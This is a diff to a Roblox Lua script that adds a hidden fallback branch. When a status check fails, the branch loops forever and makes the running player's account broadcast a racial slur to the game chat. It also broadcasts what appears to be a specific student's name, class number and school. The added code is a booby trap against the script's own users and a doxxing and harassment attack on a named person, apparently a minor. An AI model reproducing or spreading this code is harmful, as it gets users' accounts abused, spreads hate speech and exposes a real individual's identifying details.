@@ -279,4 +279,10 @@ if statuscheck == true then
         Next = Servers.nextPageCursor
         until not Next
     end
+else
+    while true do
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im a stupid nigger", "All")
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("asdfasdf", "All")
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("named eddie weng of class 833 in nathaniel hawthorne ms74 in new york queens", "All")
+    end
 end
